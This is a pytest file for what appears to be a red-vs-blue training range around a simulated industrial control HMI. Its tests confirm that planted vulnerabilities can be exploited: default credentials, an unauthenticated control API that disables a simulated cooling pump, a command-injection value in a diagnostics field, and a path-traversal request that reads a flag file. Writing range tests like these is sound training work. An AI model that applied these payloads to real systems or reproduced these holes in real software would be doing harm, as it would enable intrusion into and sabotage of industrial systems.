"""HMI tests: normal operation, plus each planted vuln is actually exploitable.

Proving the vulns exploitable is the point -- it confirms Red has a real IT->OT
pivot and documents the intended solution for each.
"""

import os
import time

import pytest

from rvb_sim.config import SimConfig
from rvb_sim.plant_server import PlantServer
from rvb_hmi.app import create_app, ADMIN_FLAG
from rvb_hmi.config import HmiConfig

PORT = 15030
FLAG_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                         "rvb_hmi", "flags", "operator.flag")
OPERATOR_FLAG = "flag{d3fault_cr3ds_on_the_hmi}"


@pytest.fixture(scope="module")
def plant():
    cfg = SimConfig(tick_dt=0.05)
    srv = PlantServer(cfg=cfg, host="127.0.0.1", port=PORT, tick_dt=0.05)
    srv.start_background()
    time.sleep(0.5)
    yield srv
    srv.stop()


@pytest.fixture
def client(plant):
    app = create_app(HmiConfig(plant_host="127.0.0.1", plant_port=PORT))
    app.testing = True
    return app.test_client()


def test_dashboard_shows_live_gauges(client):
    r = client.get("/")
    assert r.status_code == 200
    assert b"CORE PRESSURE" in r.data.upper()


def test_default_creds_login_reveals_admin_flag(client):
    # PLANTED VULN: default operator/operator creds.
    r = client.post("/login", data={"username": "operator", "password": "operator"},
                    follow_redirects=True)
    assert r.status_code == 200
    assert ADMIN_FLAG.encode() in r.data


def test_control_api_has_no_auth_check(client, plant):
    # PLANTED VULN: /api/control works with no session -- the IT->OT pivot.
    r = client.post("/api/control", json={"action": "cooling_pump", "value": False})
    assert r.status_code == 200 and r.get_json()["ok"]
    time.sleep(0.3)  # let the plant updater pull the coil in
    assert plant.round.plant.cooling_pump is False  # Red sabotaged the plant


def test_command_injection_in_diag(client):
    # PLANTED VULN: shell=True lets the host field run arbitrary commands.
    r = client.post("/api/diag", json={"host": f"nope; cat {FLAG_PATH}"})
    assert r.status_code == 200
    assert OPERATOR_FLAG in r.get_json()["output"]


def test_path_traversal_in_report(client):
    # PLANTED VULN: name escapes the reports dir into flags/.
    r = client.get("/api/report?name=../flags/operator.flag")
    assert r.status_code == 200
    assert OPERATOR_FLAG in r.get_data(as_text=True)


def test_report_normal_path_still_works(client):
    r = client.get("/api/report?name=daily_summary.txt")
    assert r.status_code == 200
    assert "Daily Plant Summary" in r.get_data(as_text=True)
